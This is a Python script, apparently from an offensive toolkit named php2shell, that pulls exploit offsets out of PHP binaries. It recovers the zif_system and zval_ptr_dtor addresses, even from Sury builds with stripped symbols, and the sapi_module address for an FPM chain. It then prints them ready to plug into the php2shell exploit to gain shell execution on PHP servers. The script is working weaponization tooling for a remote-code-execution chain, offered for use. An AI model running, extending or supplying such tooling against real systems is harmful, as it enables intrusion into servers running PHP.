#!/usr/bin/env python3
"""Extract php2shell exploit offsets from a mod_php or php-fpm binary.

Takes a path to libphp.so (Apache mod_php) or php-fpm binary and emits
the (zif_system, zval_ptr_dtor) tuple that the main php2shell chain needs
as `--zif` / `--dtor`, plus the Chain-E family's sapi_module offset.

Why this exists: Sury-built PHP binaries ship with user-level ZIF functions
stripped from .dynsym (compiled with -fvisibility=hidden on PHP functions),
so a plain `nm -D | grep zif_system` returns nothing. The scan below finds
zif_system by locating the `zend_function_entry` struct whose fname pointer
targets the "system" string in .rodata. zend_function_entry layout:

    typedef struct _zend_function_entry {
        const char *fname;              // +0x00  pointer to "system\0"
        zif_handler handler;             // +0x08  the compiled function
        const zend_internal_arg_info *arg_info;  // +0x10
        uint32_t num_args;               // +0x18
        uint32_t flags;                  // +0x1c
    } zend_function_entry;

For zval_ptr_dtor, dyn-sym export is usually preserved (it's a PHPAPI symbol),
so nm -D works. The scan is kept as a fallback.

Usage:
    extract_offsets.py <path-to-libphp.so>
    extract_offsets.py --docker <container>:<path-inside-container>
    extract_offsets.py --php-fpm <path-to-php-fpm>   # FPM Chain-E offsets
"""
import argparse
import struct
import subprocess
import sys
import tempfile
import os


def _read_bin(path):
    with open(path, "rb") as f: return f.read()


def _nm_dyn(path):
    """Return {name: addr} from `nm -D`. Empty on failure."""
    try:
        out = subprocess.run(["nm", "-D", path], capture_output=True, text=True, timeout=15).stdout
    except Exception: return {}
    syms = {}
    for ln in out.splitlines():
        p = ln.split()
        if len(p) < 3: continue
        try: addr = int(p[0], 16)
        except ValueError: continue
        if p[1] in ("T", "t", "B", "D"):
            syms[p[2]] = addr
    return syms


def _find_zif_handler(d, fn_name):
    """Scan ELF file bytes for a zend_function_entry whose fname is `fn_name`.
    Returns the handler address if found, else None.

    How it works:
    1. Enumerate occurrences of "<fn_name>\\x00" as null-terminated strings
       in the binary (candidates for .rodata string pool).
    2. For each such string's file offset (which equals its VMA since .rodata
       in PHP's libphp has coincident load address), search for a qword
       equal to that VMA. That qword is the `fname` field of a candidate
       zend_function_entry.
    3. Validate: the next qword (+0x08) must look like a function pointer
       (in .text range, roughly 0x100000..0x800000 for libphp.so);
       `arg_info` (+0x10) must point into readable data; `num_args` (+0x18)
       must be small (<=20).

    Returns the first valid match's handler, or None.
    """
    target_str = fn_name.encode() + b"\x00"
    # Find all string occurrences
    strs = []; start = 0
    while True:
        i = d.find(target_str, start)
        if i == -1: break
        strs.append(i); start = i + 1
    for sysaddr in strs:
        needle = struct.pack("<Q", sysaddr)
        pos = 0
        while True:
            i = d.find(needle, pos)
            if i == -1: break
            # Candidate zend_function_entry at offset i
            try:
                handler  = struct.unpack_from("<Q", d, i +  8)[0]
                arg_info = struct.unpack_from("<Q", d, i + 16)[0]
                num_args = struct.unpack_from("<I", d, i + 24)[0]
            except struct.error: break
            # Validate: handler in plausible .text range, arg_info in rodata range,
            # num_args small
            if (0x100000 <= handler <= 0x900000
                    and arg_info > 0x100000
                    and 0 <= num_args <= 20):
                return handler
            pos = i + 1
    return None


def extract_mod_php(binpath):
    """Extract (zif_system, zval_ptr_dtor) for the mod_php chain.
    Returns dict with keys zif, dtor, and 'source' describing how each
    was obtained."""
    d = _read_bin(binpath)
    if d[:4] != b"\x7fELF":
        raise ValueError(f"{binpath} is not an ELF binary")
    syms = _nm_dyn(binpath)
    out = {"zif": None, "dtor": None, "source": {}}
    # zif_system: dynsym first (Docker builds export it), fallback to scan (Sury strips)
    if "zif_system" in syms:
        out["zif"] = syms["zif_system"]; out["source"]["zif"] = "dynsym"
    else:
        h = _find_zif_handler(d, "system")
        if h is not None:
            out["zif"] = h; out["source"]["zif"] = "function_entry_scan"
    # zval_ptr_dtor: dynsym (always exported — PHPAPI)
    if "zval_ptr_dtor" in syms:
        out["dtor"] = syms["zval_ptr_dtor"]; out["source"]["dtor"] = "dynsym"
    return out


def extract_fpm(binpath):
    """Extract Chain-E FPM offsets. Needs: sapi_module (global struct address),
    system via libc (not from the FPM binary itself)."""
    d = _read_bin(binpath)
    if d[:4] != b"\x7fELF":
        raise ValueError(f"{binpath} is not an ELF binary")
    syms = _nm_dyn(binpath)
    out = {"source": {}}
    # sapi_module is a global exported from the FPM main. In FPM the exported
    # name is "sapi_module". Not always exported; scan for pattern as fallback.
    if "sapi_module" in syms:
        out["sapi_vma"] = syms["sapi_module"]; out["source"]["sapi_vma"] = "dynsym"
    # system() address comes from libc, not the FPM binary — populate separately
    # by running `nm -D /path/to/libc.so.6 | grep ' T system$'` on target.
    return out


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("binpath", nargs="?", help="path to libphp.so or php-fpm")
    ap.add_argument("--docker", help="copy from container: --docker name:/path")
    ap.add_argument("--php-fpm", action="store_true", help="extract FPM Chain-E offsets (sapi_module)")
    ap.add_argument("--json", action="store_true", help="emit JSON")
    a = ap.parse_args()

    # Resolve binary path
    tmp = None
    try:
        if a.docker:
            try: container, path = a.docker.split(":", 1)
            except ValueError:
                print("--docker needs name:/path/inside/container", file=sys.stderr); return 2
            fd, tmp = tempfile.mkstemp(suffix=".bin"); os.close(fd)
            r = subprocess.run(["docker", "cp", f"{container}:{path}", tmp], capture_output=True)
            if r.returncode:
                print(f"docker cp failed: {r.stderr.decode(errors='replace')[:200]}", file=sys.stderr); return 2
            binpath = tmp
        elif a.binpath:
            binpath = a.binpath
        else:
            ap.print_help(); return 2

        if a.php_fpm:
            result = extract_fpm(binpath)
        else:
            result = extract_mod_php(binpath)

        if a.json:
            import json
            print(json.dumps(result, indent=2, default=lambda x: hex(x) if isinstance(x, int) else str(x)))
        else:
            if a.php_fpm:
                print(f"# FPM Chain-E offsets ({binpath}):")
                if result.get("sapi_vma"):
                    print(f"sapi_vma = {result['sapi_vma']:#x}  (source: {result['source'].get('sapi_vma', '?')})")
                else:
                    print("sapi_vma not found")
            else:
                print(f"# mod_php chain offsets ({binpath}):")
                if result.get("zif"):
                    print(f"zif_system    = {result['zif']:#x}   (source: {result['source'].get('zif', '?')})")
                else:
                    print("zif_system not found")
                if result.get("dtor"):
                    print(f"zval_ptr_dtor = {result['dtor']:#x}   (source: {result['source'].get('dtor', '?')})")
                else:
                    print("zval_ptr_dtor not found")
                if result.get("zif") and result.get("dtor"):
                    print(f'\n# CE_OFFSETS entry (add to php2shell.py OFFSETS table):\n'
                          f'# "<version>": ({result["zif"]:#x}, {result["dtor"]:#x}),')
                    print(f'\n# Or pass to the CLI:\n'
                          f'# python3 php2shell.py --zif {result["zif"]:#x} --dtor {result["dtor"]:#x} ...')
    finally:
        if tmp:
            try: os.unlink(tmp)
            except OSError: pass
    return 0


if __name__ == "__main__":
    sys.exit(main())
